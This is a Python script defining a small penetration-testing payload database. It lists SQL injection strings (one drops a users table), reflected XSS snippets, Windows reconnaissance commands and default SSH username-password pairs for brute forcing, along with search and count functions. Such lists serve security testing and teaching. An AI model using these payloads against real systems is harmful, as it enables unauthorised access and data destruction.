#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MCP (Metasploit Compatible Payloads) 渗透载荷数据库
MCP (Metasploit Compatible Payloads) Database for Penetration Testing

包含各种类型的渗透测试载荷：
- Web应用攻击载荷
- 系统漏洞利用载荷
- 网络服务攻击载荷
- 数据库攻击载荷
- 后门和持久化载荷
"""

import json
from typing import Dict, List, Any

class MCPPayloadsDatabase:
    """MCP渗透载荷数据库"""
    
    def __init__(self):
        self.payloads = self._load_payloads()
        self.categories = self._get_categories()
    
    def _load_payloads(self) -> Dict[str, Any]:
        """加载所有渗透载荷"""
        return {
            "web_application": {
                "sql_injection": {
                    "basic_sqli": {
                        "name": "基础SQL注入",
                        "description": "基本的SQL注入攻击载荷",
                        "payloads": [
                            "' OR '1'='1",
                            "' OR 1=1--",
                            "' UNION SELECT NULL--",
                            "1' AND SLEEP(5)--",
                            "'; DROP TABLE users--"
                        ],
                        "technique": "SQL Injection",
                        "risk": "High",
                        "platform": "All"
                    }
                },
                "xss": {
                    "reflected_xss": {
                        "name": "反射型XSS",
                        "description": "反射型跨站脚本攻击载荷",
                        "payloads": [
                            "<script>alert('XSS')</script>",
                            "<img src=x onerror=alert('XSS')>",
                            "<svg onload=alert('XSS')>",
                            "<body onload=alert('XSS')>"
                        ],
                        "technique": "Cross-Site Scripting",
                        "risk": "Medium",
                        "platform": "Web"
                    }
                }
            },
            "system_exploits": {
                "windows": {
                    "cmd_execution": {
                        "name": "Windows命令执行",
                        "description": "Windows系统命令执行载荷",
                        "payloads": [
                            "cmd.exe /c whoami",
                            "powershell -c Get-Process",
                            "net user",
                            "systeminfo"
                        ],
                        "technique": "Command Execution",
                        "risk": "High",
                        "platform": "Windows"
                    }
                }
            },
            "network_services": {
                "ssh": {
                    "ssh_bruteforce": {
                        "name": "SSH暴力破解",
                        "description": "SSH常用用户名密码组合",
                        "payloads": [
                            "root:root",
                            "admin:admin",
                            "test:test",
                            "guest:guest"
                        ],
                        "technique": "Brute Force",
                        "risk": "High",
                        "platform": "SSH"
                    }
                }
            }
        }
    
    def _get_categories(self) -> List[str]:
        """获取所有分类"""
        return list(self.payloads.keys())
    
    def search_payloads(self, keyword: str) -> List[Dict[str, Any]]:
        """搜索载荷"""
        results = []
        for category_name, category in self.payloads.items():
            for subcategory_name, subcategory in category.items():
                for payload_name, payload_data in subcategory.items():
                    if (keyword.lower() in payload_data['name'].lower() or 
                        keyword.lower() in payload_data['description'].lower()):
                        results.append({
                            'category': category_name,
                            'name': payload_data['name'],
                            'description': payload_data['description'],
                            'payloads': payload_data['payloads'][:3]
                        })
        return results
    
    def get_all_payloads_count(self) -> Dict[str, int]:
        """获取载荷统计"""
        stats = {}
        total_payloads = 0
        
        for category_name, category in self.payloads.items():
            category_count = 0
            for subcategory in category.values():
                for payload_data in subcategory.values():
                    category_count += len(payload_data['payloads'])
                    total_payloads += len(payload_data['payloads'])
            stats[category_name] = category_count
        
        stats['total'] = total_payloads
        return stats

def main():
    """主函数示例"""
    db = MCPPayloadsDatabase()
    
    print("MCP渗透载荷数据库")
    print("=" * 50)
    
    # 显示统计信息
    stats = db.get_all_payloads_count()
    print(f"总载荷数量: {stats['total']}")
    
    # 搜索示例
    print("\n搜索 'SQL' 的结果:")
    results = db.search_payloads("SQL")
    for result in results:
        print(f"- {result['name']}: {result['description']}")

if __name__ == "__main__":
    main()